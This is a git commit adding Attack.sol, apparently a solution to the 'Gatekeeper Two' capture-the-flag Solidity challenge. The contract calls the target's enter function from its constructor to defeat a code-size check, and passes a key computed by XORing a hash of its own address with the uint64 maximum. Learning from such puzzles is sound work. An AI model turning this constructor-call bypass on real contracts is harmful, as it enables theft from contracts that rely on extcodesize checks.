4bb1c9f112c39f66c7041257c1ae968ce1a67f93
0xgtim <99255480+timou0911@users.noreply.github.com>
2024-12-13 11:21:21 +0800

    Create Attack.sol

--- 14. Gatekeeper Two ★★★☆☆/Attack.sol
+++ 14. Gatekeeper Two ★★★☆☆/Attack.sol
@@ -1,1 +1,18 @@
+// SPDX-License-Identifier: MIT
 
+interface GateKeeperTwo {
+    function enter(bytes8 _gateKey) external returns (bool);
+}
+
+pragma solidity ^0.8.0;
+
+contract Attack {
+
+    GateKeeperTwo private target;
+
+    constructor(address _targetAddr) {
+        target = GateKeeperTwo(_targetAddr);
+        bytes8 gateKey = bytes8(keccak256(abi.encodePacked(address(this)))) ^ bytes8(type(uint64).max);
+        target.enter(gateKey);
+    }
+}
